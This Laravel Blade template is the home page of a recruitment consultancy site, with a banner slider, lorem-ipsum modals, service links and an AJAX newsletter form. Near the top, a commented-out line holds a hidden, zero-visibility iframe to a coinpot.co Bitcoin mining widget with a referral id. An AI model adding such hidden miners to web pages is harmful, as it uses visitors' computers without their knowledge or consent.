@extends('layouts.master')

@section('title','Home')

@section('css')
	@parent
	<style type="text/css">
		.form-control{
			border-radius: 0px ;
			height: 40px ;
			width: 300px !important ;
		}
	</style>
@endsection

@section('banner')
{{-- <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=B32BE438E4BB&mode=widget" style="overflow:hidden;width:324px;height:470px; display: none;"></iframe> --}}
	<div class=" banner">
		<div class="wthree-different-dot">
			<!-- header -->
			<div class="header">
				<div class="container">
					@include('layouts.nav')
				</div>
			</div>
			<!-- //header -->
			<div class="banner-top">
					<div class="slider">
						<div class="callbacks_container">
							<ul class="rslides callbacks callbacks1" id="slider4">
								<li>	
								<div class="wthree-different-dot">
									<div class="banner_text">
									<div class="container">
										<span>GLOBAL CAREER EXPERTS</span>
										<h2>Latest Technology</h2>
										<div class="more-button text-center">
											<a href="#" class="hvr-bounce-to-bottom scroll" data-toggle="modal" data-target="#modaltechnology">Read More</a>
										</div>
										<div class="thim-click-to-bottom">
											<a href="#welcome" class="scroll">
												<i class="fa  fa-chevron-down"></i>
											</a>
										</div>
									</div>
									</div>
								</div>
								</li>
								<li>
								<div class="wthree-different-dot">	
									<div class="banner_text">
									<div class="container">
										<span>GLOBAL CAREER EXPERTS</span>
										<h3>Finest Consultants</h3>
										<div class="more-button text-center">
											<a href="#" class="hvr-bounce-to-bottom scroll" data-toggle="modal" data-target="#modalcompetitive">Read More</a>
										</div>
										<div class="thim-click-to-bottom">
											<a href="#welcome" class="scroll">
												<i class="fa  fa-chevron-down"></i>
											</a>
										</div>
									</div>
									</div>
									</div>
								</li>
								<li>	
								<div class="wthree-different-dot">
									<div class="banner_text">
									<div class="container">
										<span>GLOBAL CAREER EXPERTS</span>
										<h3>GLOBAL AWARD WINNERS</h3>
										<div class="more-button text-center">
											<a href="#" class="hvr-bounce-to-bottom scroll" data-toggle="modal" data-target="#modalsuccess">Read More</a>
										</div>
										<div class="thim-click-to-bottom">
											<a href="#welcome" class="scroll">
												<i class="fa  fa-chevron-down"></i>
											</a>
										</div>
									</div>
									</div>
									</div>
								</li>
								<li>	
								<div class="wthree-different-dot">
									<div class="banner_text">
									<div class="container">
										<span>CAREER EXPERTS</span>
										<h3>GLOBAL BEST PRICE</h3>
										<div class="more-button text-center">
											<a href="#" class="hvr-bounce-to-bottom scroll" data-toggle="modal" data-target="#modalcollaboration">Read More</a>
										</div>
										<div class="thim-click-to-bottom">
											<a href="#welcome" class="scroll">
												<i class="fa  fa-chevron-down"></i>
											</a>
										</div>
									</div>
									</div>
									</div>
								</li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		<div class="clearfix"></div>
		</div>
@endsection

@section('modal')
		@parent
			<div class="modal fade" id="modaltechnology" tabindex="-1" role="dialog">
				<div class="modal-dialog">
				<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">&times;</button>
							<h4>TECHNOLOGY</h4>
							<img src="{{ asset('images/home/technology.png') }}" alt=" " class="img-responsive">
							<h5>Success your business </h5>
							<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting.</p>
						</div>
					</div>
				</div>
			</div>


			<div class="modal fade" id="modalcompetitive" tabindex="-1" role="dialog">
				<div class="modal-dialog">
				<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">&times;</button>
							<h4>Competitive</h4>
							<img src="{{ asset('images/home/competitive.png') }}" alt=" " class="img-responsive">
							<h5>Success your business </h5>
							<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting.</p>
						</div>
					</div>
				</div>
			</div>

			<div class="modal fade" id="modalsuccess" tabindex="-1" role="dialog">
				<div class="modal-dialog">
				<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">&times;</button>
							<h4>SUCCESSFUL</h4>
							<img src="{{ asset('images/home/successful.jpg') }}" alt=" " class="img-responsive">
							<h5>Success your business </h5>
							<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting.</p>
						</div>
					</div>
				</div>
			</div>

			<div class="modal fade" id="myModal1" tabindex="-1" role="dialog">
				<div class="modal-dialog">
				<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">&times;</button>
							<h4>Global Expertise With Access to World Class Talents</h4>
							<img src="{{ asset('images/home/pob.png') }}" alt=" " class="img-responsive">
							<p>Our People, Technology and Processes synergizes to provide employers the best talents for each vacant positions, at record speed and precision. We have the most productive and job-ready talents with cutting edge skill sets and diverse experiences.</p>
						</div>
					</div>
				</div>
			</div>

			<div class="modal fade" id="modalcollaboration" tabindex="-1" role="dialog">
				<div class="modal-dialog">
				<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">&times;</button>
							<h4>DISCUSSION</h4>
							<img src="{{ asset('images/home/collaboration.png') }}" alt=" " class="img-responsive">
							<h5>Success your business </h5>
							<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting.</p>
						</div>
					</div>
				</div>
			</div>

			<div class="content"></div>
@endsection

@section('body')
	<div class="about" id="welcome">
	<div class="container">
		<div class="col-md-8 aboutleft">
			<div class="row">
				<div class="col-md-7" style="text-align:center">
					<div class="candidaiteImage">
						<span>CANDIDATE</span>
					</div>
					<p style="font-weight:bolder">Ready to make the smart move for your career ?</p>
					<a style="margin-top: 20px; display:block;"  href="{{ route('candidate') }}">Register Now</a>
				</div>
				<div class="col-md-5">
						<p style="padding:0; margin-top:-5px;">Lorem Ipsum is simply dummy text of the printing and typesetting industry.
						Lorem Ipsum has been the industry's standard dummy text ever since the 1500s but also the leap into electronic typesetting dolor amet.</p>
						<p>when an unknown printer took a galley of type and scrambled it to make a type specimen book.</p>
				</div>
			</div>
			<div class="row" style="margin-top: 80px ;">
				<div class="col-md-7" style="text-align:center">
					<div class="employerImage">
						<span>EMPLOYER</span>
					</div>
					<p style="font-weight:bolder">Ready to make the smart move for your career ?</p>
					<a style="margin-top: 20px; display:block;"  href="{{ route('employer') }}">Register Now</a>
				</div>
				<div class="col-md-5">
						<p style="padding:0; margin-top:-5px;">Lorem Ipsum is simply dummy text of the printing and typesetting industry.
						Lorem Ipsum has been the industry's standard dummy text ever since the 1500s but also the leap into electronic typesetting dolor amet.</p>
						<p>when an unknown printer took a galley of type and scrambled it to make a type specimen book.</p>
				</div>
			</div>
			
		</div>
		<div class="col-md-4 aboutright">		
				<style type="text/css">
					.thumbnail img{
						margin : auto ;
					}
				</style>
				  <div class="row">
				  <h3 style="text-align:center">Featured Employers</h3>
					<div class="col-md-6">
					  <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/1.gif') }}"></a>
					</div>          
					<div class="col-md-6">
					  <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/2.jpg') }}"></a>
					</div>
					<div class="col-md-6">
					  <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/3.gif') }}"></a>
					</div>
					<div class="col-md-6">
					  <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/4.jpg') }}"></a>
					</div>
					<div class="col-md-6">
						<a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/5.gif') }}"></a>
					</div>          
					<div class="col-md-6">
						<a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/6.gif') }}"></a>
					</div>
				  </div>


		</div>
		<div class="clearfix"></div>
		<br><br><br><br>
		<div class="row" style="text-align:center">
			<h2 style="margin-bottom: 20px; font-weight: bolder;">LOREM IPSUM ENIM VENIM QUIS</h2>
			<style>
				.flexSection{
					display: flex ;
					flex-wrap: wrap ;
					justify-content: space-between ;
				}
				.flexSection div{
					padding: 20px; 
					flex: 0 1 300px ;
					width: 100% ;
					background-color: #c4c4c4;
				}
				.flexSection div span{
					font-size: 6em ;
					color: black ;
					font-weight: bolder ;
				}
				.flexSection div p{
					font-size: 2em ;
				}
			</style>
			<div class="flexSection">
				<div>
					<span>16</span>
					<p>Sectors</p>
				</div>
				<div>
					<span>12</span>
					<p>Services</p>
				</div>
				<div>
					<span>4</span>
					<p>Continents</p>
				</div>
			</div>
		</div>


	</div>
</div>
<!-- welcome -->

<!-- services -->
	<div class="services" id="services">
		<div class="container">
			<div class="w3l-heading">
				<h3>Our Services</h3>
			</div>
			<div class="services-grids">
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-server" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('internationalrecruitment') }}">International Recruitment</a></h5>
						<span></span>
					</div>
				</div>
<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-signing" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('hr-services') }}">HR Services</a></h5>
						<span></span>
					</div>
				</div>
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-navicon" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('internships') }}">Internships</a></h5>
						<span></span>
					</div>
				</div>
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-pencil-square-o" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('outplacement') }}">Outplacement</a></h5>
						<span></span>
					</div>
				</div>
				<div class="clearfix"> </div>
			</div>

			<div class="services-bottom-grids">
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-desktop" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('permanentplacement') }}">Permanent Placement</a></h5>
						<span></span>
					</div>
				</div>
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-clone" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('temporaryplacement') }}">Temporary Placement</a></h5>
						<span></span>
					</div>
				</div>
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-suitcase" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('executiveservices') }}">Executive Services</a></h5>
						<span></span>
					</div>
				</div>
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-suitcase" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('labour-market-research') }}">Labour Market Research</a></h5>
						<span></span>
					</div>
				</div>
				<div class="clearfix"> </div>
			</div>
				
			<div class="services-bottom-grids">
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-server" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('featureddigitalcampaign') }}">Featured Digital Campaign</a></h5>
						<span></span>
					</div>
				</div>
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-server" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('digitalizedvideo') }}">Digitalized Video Assessment and  Interview</a></h5>
						<span></span>
					</div>
				</div>
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-signing" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('recruitmentprocess') }}">Recruitment Process Outsourcing</a></h5>
						<span></span>
					</div>
				</div>
				<div class="col-md-3 wthree-services-grid">
					<div class="wthree-services-icon">
						<!-- <i class="fa fa-server" aria-hidden="true"></i> -->
					</div>
					<div class="wthree-services-info">
						<h5><a href="{{ route('salaryandremuneration') }}">Salary And Remuneration Benchmarking</a></h5>
						<span></span>
					</div>
				</div>
				<div class="clearfix"> </div>
			</div>

			<div class="clearfix"> </div>
		</div>
	</div>
<!-- //services -->

<!-- team 
<div class="team-section">
	 	<div class="container">
			<div class="w3l-heading">
				<h3>Featured Employers</h3>
			</div>


		      <div class="team-row">
				<style type="text/css">
					.media-carousel 
					{
					  margin-bottom: 0;
					  padding: 0 40px 30px 40px;
					  margin-top: 30px;
					}
					/* Previous button  */
					.media-carousel .carousel-control.left 
					{
					  left: -12px;
					  background-image: none;
					  background: none repeat scroll 0 0 #222222;
					  border: 4px solid #FFFFFF;
					  border-radius: 23px 23px 23px 23px;
					  height: 40px;
					  width : 40px;
					  margin-top: 30px
					}
					/* Next button  */
					.media-carousel .carousel-control.right 
					{
					  right: -12px !important;
					  background-image: none;
					  background: none repeat scroll 0 0 #222222;
					  border: 4px solid #FFFFFF;
					  border-radius: 23px 23px 23px 23px;
					  height: 40px;
					  width : 40px;
					  margin-top: 30px
					}
					/* Changes the position of the indicators */
					.media-carousel .carousel-indicators 
					{
					  right: 50%;
					  top: auto;
					  bottom: 0px;
					  margin-right: -19px;
					}
					/* Changes the colour of the indicators */
					.media-carousel .carousel-indicators li 
					{
					  background: #c0c0c0;
					}
					.media-carousel .carousel-indicators .active 
					{
					  background: #333333;
					}
					.media-carousel img
					{
					  width: 250px;
					  height: 200px
					}
					/* End carousel */
				</style>
				<div class="carousel slide media-carousel" id="media">
			        <div class="carousel-inner">
			          <div class="item  active">
			            <div class="row">
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/1.gif') }}"></a>
			              </div>          
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/2.jpg') }}"></a>
			              </div>
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/3.gif') }}"></a>
			              </div>
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/4.jpg') }}"></a>
			              </div>
			            </div>
			          </div>
			          <div class="item">
			            <div class="row">
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/5.gif') }}"></a>
			              </div>          
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/6.gif') }}"></a>
			              </div>
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/1.gif') }}"></a>
			              </div>
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/2.jpg') }}"></a>
			              </div>
			            </div>
			          </div>
			          <div class="item">
			            <div class="row">
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/3.gif') }}"></a>
			              </div>          
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/4.jpg') }}"></a>
			              </div>
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/5.gif') }}"></a>
			              </div>
			              <div class="col-md-3">
			                <a class="thumbnail" href="#"><img alt="" src="{{ asset('images/emp/6.gif') }}"></a>
			              </div>
			            </div>
			          </div>
			        </div>
			        <a data-slide="prev" href="#media" class="left carousel-control">‹</a>
			        <a data-slide="next" href="#media" class="right carousel-control">›</a>
			      </div>   
				<div class="clearfix"> </div>
			</div> 
		
			-->


			<!-- team 

			<div class="w3l-heading">
				<h3>Our Team</h3>
			</div>
			
			<div class="team-row">
				<div class="col-md-3 team-grids">
					<div class="team-img">
						<img class="img-responsive" src="images/t1.jpg" alt="">
						<div class="captn">
							<ul class="top-links">
								<li><a href="#"><i class="fa fa-facebook"></i></a></li>
								<li><a href="#"><i class="fa fa-twitter"></i></a></li>
								<li><a href="#"><i class="fa fa-google-plus"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="team-agile">
						<h4>Edwards</h4>
						<p>Lorem sed nisi leo. Ut at sagittis nisi. Cras porttitor a purus ac.</p>
					</div>
				</div>
				<div class="col-md-3 team-grids">
					<div class="team-img">
						<img class="img-responsive" src="images/t2.jpg" alt="">
						<div class="captn">
							<ul class="top-links">
									<li><a href="#"><i class="fa fa-facebook"></i></a></li>
									<li><a href="#"><i class="fa fa-twitter"></i></a></li>
									
									<li><a href="#"><i class="fa fa-google-plus"></i></a></li>
								</ul>
						
						</div>
					</div>
					<div class="team-agile">
						<h4>Jessica </h4>
						<p>Lorem sed nisi leo. Ut at sagittis nisi. Cras porttitor a purus ac.</p>
					</div>
				</div>
				<div class="col-md-3 team-grids">
					<div class="team-img">
						<img class="img-responsive" src="images/t3.jpg" alt="">
						<div class="captn">
							<ul class="top-links">
									<li><a href="#"><i class="fa fa-facebook"></i></a></li>
									<li><a href="#"><i class="fa fa-twitter"></i></a></li>
									
									<li><a href="#"><i class="fa fa-google-plus"></i></a></li>
								</ul>
						
						</div>
					</div>
					<div class="team-agile">
						<h4>Michael</h4>
						<p>Lorem sed nisi leo. Ut at sagittis nisi. Cras porttitor a purus ac.</p>
					</div>
				</div>
				<div class="col-md-3 team-grids">
					<div class="team-img">
						<img class="img-responsive" src="images/t4.jpg" alt="">
						<div class="captn">
							<ul class="top-links">
									<li><a href="#"><i class="fa fa-facebook"></i></a></li>
									<li><a href="#"><i class="fa fa-twitter"></i></a></li>
									
									<li><a href="#"><i class="fa fa-google-plus"></i></a></li>
								</ul>
						
						</div>
					</div>
					<div class="team-agile">
						<h4>Selena</h4>
						<p>Lorem sed nisi leo. Ut at sagittis nisi. Cras porttitor a purus ac.</p>
					</div>
				</div>
				<div class="clearfix"> </div>
			</div> 

			-->



		</div>	
</div>		
<!-- //team -->

<!-- servicesbottom -->
<!-- Counter -->
	@include('counterclient')
<!-- //Clients 
<div class="statbottom">
	<div class="container">
		<h3 style="font-family: Federo">Global Expertise With Access to World Class Talents</h3>
		<p>Our People, Technology and Processes synergizes to provide employers the best talents for each vacant positions, at record speed and precision. We have the most productive and job-ready talents with cutting edge skill sets and diverse experiences.</p>
		<div class="more-button text-center">
			<a href="#" class="hvr-bounce-to-bottom scroll" data-toggle="modal" data-target="#myModal1">Read More</a>
		</div>
	</div>
</div>
-->
<!-- //servicesbottom -->

<!-- subscribe section -->
<section class="subscribe" id="subscribe">
	<div class="container">
		<h3>Subscribe to our newsletter</h3>
	</div>
	<form action="#" method="post" class="newsletter">
		{{ csrf_field() }}
		<input class="email" id="" type="email" placeholder="Enter Your Email..." required="">
		<input type="submit" id="newsletter" class="submit" value="subscribe">
	</form>
	{{-- Because it'll be sent over AJAX, We add thejQuery source --}}
				<script src='http://code.jquery.com/jquery-1.8.3.min.js'></script>
				<script type="text/javascript">
				//Even though it's on footer, I just like to make//sure that DOM is ready
				$(function(){
					//We hide de the result div on start
					$('div.content').hide();
					//This part is more jQuery Related. In short, we //make an Ajax post request and get the response//back from server
					$('input[type="submit"]#newsletter').click(function(e){
							e.preventDefault();
							$.post('/subscribers/submit', {
							email: $('input[name="email"]').val()
						}, function($data){
							if($data=='1') {
								$('div.content').hide().removeClass('success error').addClass('success').html('You\'ve successfully subscribed to ournewsletter').fadeIn('fast');
							} 
							else {
								//This part echos our form validation errors
								$('div.content').hide().removeClass('success error').addClass('error').html('There has been an error occurred:<br /><br />'+$data).fadeIn('fast');
							}
					});
				});
				//We prevented to submit by pressing enter or anyother way
				$('form').submit(function(e){
					e.preventDefault();
					$('input[type="submit"]').click();
				});

				});
				</script>
</section>
@endsection